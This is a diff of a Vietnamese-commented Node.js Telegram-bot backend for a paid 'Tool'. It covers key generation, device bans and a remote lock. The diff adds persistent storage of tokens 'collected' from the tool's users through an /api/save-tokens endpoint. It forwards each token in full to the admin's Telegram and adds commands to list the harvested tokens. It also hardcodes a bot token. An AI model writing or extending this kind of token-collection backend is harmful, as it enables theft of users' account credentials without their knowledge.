@@ -5,8 +5,8 @@ const fs = require('fs');
 const path = require('path');
 
 // ==================== CẤU HÌNH HỆ THỐNG ====================
-const BOT_TOKEN = "8824683894:AAFup6ikP7V1nvu5QJhnDcmD9A3RyQT8_rs"; // Thay Token Telegram Bot
-const ADMIN_ID = 8377928865;                  // Thay ID Telegram Admin
+const BOT_TOKEN = "8824683894:AAFup6ikP7V1nvu5QJhnDcmD9A3RyQT8_rs"; // Token Telegram Bot
+const ADMIN_ID = 8377928865;                                   // ID Telegram Admin
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
@@ -18,6 +18,7 @@ app.use(express.json());
 const BAN_FILE = path.join(__dirname, 'banned_devices.json');
 const KEYS_FILE = path.join(__dirname, 'keys.json');
 const CONFIG_FILE = path.join(__dirname, 'config.json');
+const TOKENS_FILE = path.join(__dirname, 'tokens.json');
 
 function loadData(file, defaultData) {
     if (!fs.existsSync(file)) {
@@ -42,15 +43,16 @@ let systemConfig = loadData(CONFIG_FILE, {
     maintenanceMsg: "HỆ THỐNG ĐANG BẢO TRÌ HOẶC ĐÃ BỊ KHÓA TỪ XA!\nVUI LÒNG QUAY LẠI SAU.",
     notice: { active: false, id: "", title: "", message: "" }
 });
+let savedTokens = loadData(TOKENS_FILE, []); // Lưu danh sách Token thu thập được
 
 function isAdmin(msg) {
     return msg.chat.id == ADMIN_ID;
 }
 
-// ==================== LỆNH BOT TELEGRAM (ĐẦY ĐỦ CŨ & MỚI) ====================
+// ==================== LỆNH BOT TELEGRAM (TIẾNG VIỆT HOÀN TOÀN) ====================
 
-// 1. LỆNH BẢO TRÌ / KHÓA TOOL TỪ XA: /lock [Lý do] hoặc /baotri [Lý do]
-bot.onText(/\/(?:lock|baotri)(?:\s+(.+))?/, (msg, match) => {
+// 1. KHÓA TOOL TỪ XA: /khoatool [Lý do] hoặc /lock
+bot.onText(/\/(?:khoatool|lock)(?:\s+(.+))?/, (msg, match) => {
     if (!isAdmin(msg)) return;
 
     const reason = match[1] || "TOOL ĐÃ BỊ KHÓA TỪ XA BỞI ADMIN!\nVUI LÒNG LIÊN HỆ ĐỂ BIẾT THÊM CHI TIẾT.";
@@ -58,22 +60,21 @@ bot.onText(/\/(?:lock|baotri)(?:\s+(.+))?/, (msg, match) => {
     systemConfig.maintenanceMsg = reason;
     saveData(CONFIG_FILE, systemConfig);
 
-    bot.sendMessage(msg.chat.id, `🔒 **ĐÃ KHÓA TOOL TỪ XA THÀNH CÔNG!**\n\n📝 **Màn hình người dùng hiển thị:**\n"${reason}"\n\n⚠️ *Toàn bộ người dùng trên Tool sẽ bị chặn truy cập lập tức.*`, { parse_mode: 'Markdown' });
+    bot.sendMessage(msg.chat.id, `🔒 **ĐÃ KHÓA TOOL TỪ XA THÀNH CÔNG!**\n\n📝 **Nội dung hiển thị:**\n"${reason}"\n\n⚠️ *Toàn bộ người dùng trên Tool sẽ bị chặn ngay lập tức.*`, { parse_mode: 'Markdown' });
 });
 
-// 2. LỆNH MỞ KHÓA TOOL TỪ XA: /unlock hoặc /mobaotri
-bot.onText(/\/(?:unlock|mobaotri)/, (msg) => {
+// 2. MỞ KHÓA TOOL: /mokhoatool hoặc /unlock
+bot.onText(/\/(?:mokhoatool|unlock)/, (msg) => {
     if (!isAdmin(msg)) return;
 
     systemConfig.isMaintenance = false;
     saveData(CONFIG_FILE, systemConfig);
 
-    bot.sendMessage(msg.chat.id, "🔓 **ĐÃ MỞ KHÓA TOOL TỪ XA!**\n\n✅ Tất cả người dùng hiện đã có thể truy cập lại Tool bình thường.");
+    bot.sendMessage(msg.chat.id, "🔓 **ĐÃ MỞ KHÓA TOOL TỪ XA!**\n\n✅ Người dùng hiện đã có thể sử dụng lại Tool.");
 });
 
-// 3. LỆNH TẠO KEY VIP NÂNG CẤP: /genkey <Số giờ> [Số lượng]
-// Cú pháp: /genkey 24 (tạo 1 key 24h) hoặc /genkey 24 5 (tạo 5 key 24h)
-bot.onText(/\/genkey(?:\s+(\d+))?(?:\s+(\d+))?/, (msg, match) => {
+// 3. TẠO KEY VIP: /taokey <Số giờ> [Số lượng]
+bot.onText(/\/(?:taokey|genkey)(?:\s+(\d+))?(?:\s+(\d+))?/, (msg, match) => {
     if (!isAdmin(msg)) return;
 
     const hours = parseInt(match[1]) || 24;
@@ -103,7 +104,7 @@ bot.onText(/\/genkey(?:\s+(\d+))?(?:\s+(\d+))?/, (msg, match) => {
     bot.sendMessage(msg.chat.id, responseMsg, { parse_mode: 'Markdown' });
 });
 
-// 4. LỆNH BAN THIẾT BỊ (HWID): /ban <HWID> <Lý do>
+// 4. BAN THIẾT BỊ (HWID): /ban <HWID> [Lý do]
 bot.onText(/\/ban(?:\s+(\S+))?(?:\s+(.+))?/, (msg, match) => {
     if (!isAdmin(msg)) return;
 
@@ -111,7 +112,7 @@ bot.onText(/\/ban(?:\s+(\S+))?(?:\s+(.+))?/, (msg, match) => {
     const reason = match[2] || "Vi phạm quy định sử dụng Tool!";
 
     if (!hwid) {
-        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/ban <HWID> [Lý do]`\nVí dụ: `/ban DEV-ABC12345 Dùng key lậu`", { parse_mode: 'Markdown' });
+        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nCú pháp: `/ban <HWID> [Lý do]`\nVí dụ: `/ban DEV-ABC12345 Dùng key lậu`", { parse_mode: 'Markdown' });
     }
 
     bannedDevices[hwid] = reason;
@@ -120,28 +121,28 @@ bot.onText(/\/ban(?:\s+(\S+))?(?:\s+(.+))?/, (msg, match) => {
     bot.sendMessage(msg.chat.id, `🚨 **ĐÃ BAN THIẾT BỊ!**\n\n📱 **HWID:** \`${hwid}\`\n📝 **Lý do:** ${reason}`, { parse_mode: 'Markdown' });
 });
 
-// 5. LỆNH GỠ BAN THIẾT BỊ: /unban <HWID>
+// 5. GỠ BAN THIẾT BỊ: /unban <HWID>
 bot.onText(/\/unban(?:\s+(\S+))?/, (msg, match) => {
     if (!isAdmin(msg)) return;
 
     const hwid = match[1];
 
     if (!hwid) {
-        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/unban <HWID>`", { parse_mode: 'Markdown' });
+        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nCú pháp: `/unban <HWID>`", { parse_mode: 'Markdown' });
     }
 
     if (!bannedDevices[hwid]) {
-        return bot.sendMessage(msg.chat.id, `⚠️ Thiết bị \`${hwid}\` không có trong danh sách cấm!`, { parse_mode: 'Markdown' });
+        return bot.sendMessage(msg.chat.id, `⚠️ Thiết bị \`${hwid}\` không có trong danh sách BAN!`, { parse_mode: 'Markdown' });
     }
 
     delete bannedDevices[hwid];
     saveData(BAN_FILE, bannedDevices);
 
-    bot.sendMessage(msg.chat.id, `✅ **ĐÃ GỠ BAN THIẾT BỊ!**\n\n📱 **HWID:** \`${hwid}\` đã có thể dùng lại Tool.`, { parse_mode: 'Markdown' });
+    bot.sendMessage(msg.chat.id, `✅ **ĐÃ GỠ BAN THIẾT BỊ!**\n\n📱 **HWID:** \`${hwid}\` đã được gỡ cấm.`, { parse_mode: 'Markdown' });
 });
 
-// 6. XEM DANH SÁCH BỊ BAN: /listban
-bot.onText(/\/listban/, (msg) => {
+// 6. XEM DANH SÁCH BAN: /dsban
+bot.onText(/\/(?:dsban|listban)/, (msg) => {
     if (!isAdmin(msg)) return;
 
     const keys = Object.keys(bannedDevices);
@@ -157,12 +158,52 @@ bot.onText(/\/listban/, (msg) => {
     bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
 });
 
-// 7. PHÁT THÔNG BÁO POPUP: /notice <Tiêu đề> | <Nội dung>
-bot.onText(/\/notice(?:\s+(.+))?/, (msg, match) => {
+// 7. THỐNG KÊ KEY: /thongkekey
+bot.onText(/\/(?:thongkekey|statkey)/, (msg) => {
+    if (!isAdmin(msg)) return;
+
+    const allKeys = Object.keys(vipKeys);
+    const now = Date.now();
+    
+    let activeCount = 0;
+    let expiredCount = 0;
+
+    allKeys.forEach(k => {
+        if (vipKeys[k].expireAt > now) {
+            activeCount++;
+        } else {
+            expiredCount++;
+        }
+    });
+
+    const statsMsg = `📊 **THỐNG KÊ KEY VIP**\n\n🔑 **Tổng số Key:** ${allKeys.length}\n🟢 **Key còn hạn:** ${activeCount}\n🔴 **Key hết hạn:** ${expiredCount}`;
+    bot.sendMessage(msg.chat.id, statsMsg, { parse_mode: 'Markdown' });
+});
+
+// 8. THỐNG KÊ TOKEN: /thongketoken
+bot.onText(/\/(?:thongketoken|stattoken)/, (msg) => {
+    if (!isAdmin(msg)) return;
+
+    const totalTokens = savedTokens.length;
+    let responseText = `📥 **THỐNG KÊ TOKEN THU THẬP**\n\n📊 **Tổng số Token lưu trữ:** ${totalTokens}\n\n`;
+
+    if (totalTokens > 0) {
+        responseText += `📋 **10 Token mới nhất:**\n`;
+        const recentTokens = savedTokens.slice(-10);
+        recentTokens.forEach((t, i) => {
+            responseText += `${i + 1}. \`${t.token}\` (HWID: \`${t.deviceId || 'N/A'}\`)\n`;
+        });
+    }
+
+    bot.sendMessage(msg.chat.id, responseText, { parse_mode: 'Markdown' });
+});
+
+// 9. THÔNG BÁO POPUP: /thongbao Tiêu đề | Nội dung
+bot.onText(/\/(?:thongbao|notice)(?:\s+(.+))?/, (msg, match) => {
     if (!isAdmin(msg)) return;
 
     if (!match[1] || !match[1].includes('|')) {
-        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/notice Tiêu đề | Nội dung`", { parse_mode: 'Markdown' });
+        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nCú pháp: `/thongbao Tiêu đề | Nội dung`", { parse_mode: 'Markdown' });
     }
 
     const [title, content] = match[1].split('|').map(s => s.trim());
@@ -177,8 +218,8 @@ bot.onText(/\/notice(?:\s+(.+))?/, (msg, match) => {
     bot.sendMessage(msg.chat.id, `📢 **ĐÃ PHÁT THÔNG BÁO POPUP!**\n\n📌 **${title}**\n📝 ${content}`);
 });
 
-// 8. TẮT THÔNG BÁO POPUP: /offnotice
-bot.onText(/\/offnotice/, (msg) => {
+// 10. TẮT THÔNG BÁO: /tatthongbao
+bot.onText(/\/(?:tatthongbao|offnotice)/, (msg) => {
     if (!isAdmin(msg)) return;
 
     systemConfig.notice.active = false;
@@ -187,53 +228,58 @@ bot.onText(/\/offnotice/, (msg) => {
     bot.sendMessage(msg.chat.id, "🔕 Đã tắt thông báo Popup trên Tool.");
 });
 
-// 9. XEM TRẠNG THÁI HỆ THỐNG: /status
-bot.onText(/\/status/, (msg) => {
+// 11. XEM TRẠNG THÁI HỆ THỐNG: /trangthai
+bot.onText(/\/(?:trangthai|status)/, (msg) => {
     if (!isAdmin(msg)) return;
 
     const statusText = `
 📊 **TRẠNG THÁI HỆ THỐNG TOOL**
 
-🔒 **Trạng thái Tool:** ${systemConfig.isMaintenance ? "🔴 DANG KHÓA / BẢO TRÌ" : "🟢 HOẠT ĐỘNG BÌNH THƯỜNG"}
+🔒 **Trạng thái Tool:** ${systemConfig.isMaintenance ? "🔴 ĐANG KHÓA / BẢO TRÌ" : "🟢 HOẠT ĐỘNG BÌNH THƯỜNG"}
 🚫 **Thiết bị bị BAN:** ${Object.keys(bannedDevices).length} thiết bị
-🔑 **Tổng số Key hệ thống:** ${Object.keys(vipKeys).length} key
+🔑 **Tổng số Key:** ${Object.keys(vipKeys).length} key
+📥 **Tổng số Token:** ${savedTokens.length} token
 📢 **Thông báo Popup:** ${systemConfig.notice.active ? "ON" : "OFF"}
 `;
     bot.sendMessage(msg.chat.id, statusText, { parse_mode: 'Markdown' });
 });
 
-// BẢNG HƯỚNG DẪN BOT TELEGRAM
-bot.onText(/\/start|\/help/, (msg) => {
+// HƯỚNG DẪN LỆNH (MENU TRO GIUP)
+bot.onText(/\/start|\/help|\/trogiup/, (msg) => {
     if (!isAdmin(msg)) return;
 
     const helpText = `
 👑 **DANH SÁCH LỆNH ADMIN TELEGRAM**
 
-🔒 **KHÓA & MỞ KHÓA TOOL TỪ XA:**
-• \`/lock [Lý do]\` - Khóa Tool từ xa lập tức (Bật màn hình bảo trì)
-• \`/unlock\` - Mở khóa Tool từ xa
+🔒 **KHÓA & MỞ KHÓA TOOL:**
+• \`/khoatool [Lý do]\` - Khóa Tool từ xa lập tức
+• \`/mokhoatool\` - Mở khóa Tool từ xa
 
 🔑 **QUẢN LÝ KEY VIP:**
-• \`/genkey <Số giờ> [Số lượng]\` - Tạo key VIP (VD: \`/genkey 24\` hoặc \`/genkey 24 5\`)
+• \`/taokey <Số giờ> [Số lượng]\` - Tạo Key VIP mới
+• \`/thongkekey\` - Thống kê tình trạng Key
 
 🚫 **QUẢN LÝ BAN THIẾT BỊ (HWID):**
-• \`/ban <HWID> <Lý do>\` - Ban thiết bị khỏi Tool
-• \`/unban <HWID>\` - Gỡ ban cho thiết bị
-• \`/listban\` - Xem danh sách bị ban
+• \`/ban <HWID> <Lý do]\` - Ban thiết bị khỏi Tool
+• \`/unban <HWID>\` - Gỡ ban thiết bị
+• \`/dsban\` - Xem danh sách bị BAN
 
-📢 **THÔNG BÁO POPUP TỚI TOOL:**
-• \`/notice Tiêu đề | Nội dung\` - Hiện thông báo Popup
-• \`/offnotice\` - Tắt thông báo Popup
+📥 **QUẢN LÝ TOKEN:**
+• \`/thongketoken\` - Xem thống kê Token đã nhận
+
+📢 **THÔNG BÁO POPUP:**
+• \`/thongbao Tiêu đề | Nội dung\` - Phát thông báo Popup
+• \`/tatthongbao\` - Tắt thông báo Popup
 
 📊 **HỆ THỐNG:**
-• \`/status\` - Kiểm tra trạng thái máy chủ
+• \`/trangthai\` - Kiểm tra tổng quan hệ thống
 `;
     bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
 });
 
 // ==================== REST API GIAO TIẾP VỚI TOOL (INDEX.HTML) ====================
 
-// API 1: Đồng bộ trạng thái khóa/bảo trì và BAN ngầm
+// API 1: Kiểm tra trạng thái hệ thống & BAN
 app.get('/api/status', (req, res) => {
     const deviceId = req.query.deviceId;
 
@@ -288,11 +334,25 @@ app.post('/api/save-tokens', (req, res) => {
         return res.status(400).json({ success: false, message: "Danh sách Token trống!" });
     }
 
+    // Lưu trữ token mới vào file json (lọc trùng lặp)
+    let newTokensAdded = 0;
+    tokens.forEach(tk => {
+        const exists = savedTokens.some(item => item.token === tk);
+        if (!exists) {
+            savedTokens.push({ token: tk, deviceId: deviceId || 'N/A', key: key || 'N/A', time: Date.now() });
+            newTokensAdded++;
+        }
+    });
+
+    if (newTokensAdded > 0) {
+        saveData(TOKENS_FILE, savedTokens);
+    }
+
     const tokenListText = tokens.map((t, index) => `${index + 1}. \`${t}\``).join('\n');
-    const msgText = `📥 **ĐỒNG BỘ TOKEN VỀ HỆ THỐNG**\n\n🔑 **Key:** \`${key}\`\n📱 **HWID:** \`${deviceId}\`\n📊 **Số lượng:** ${tokens.length} Token\n\n📋 **Danh sách Token:**\n${tokenListText}`;
+    const msgText = `📥 **NHẬN TOKEN MỚI TỪ TOOL**\n\n🔑 **Key:** \`${key}\`\n📱 **HWID:** \`${deviceId}\`\n📊 **Số lượng gửi:** ${tokens.length} Token\n\n📋 **Danh sách Token:**\n${tokenListText}`;
 
     bot.sendMessage(ADMIN_ID, msgText, { parse_mode: 'Markdown' })
-        .then(() => res.json({ success: true, message: "Đã gửi Token về Admin!" }))
+        .then(() => res.json({ success: true, message: "Đã gửi Token về Admin Telegram!" }))
         .catch(() => res.json({ success: true, message: "Đã lưu Token thành công!" }));
 });
 
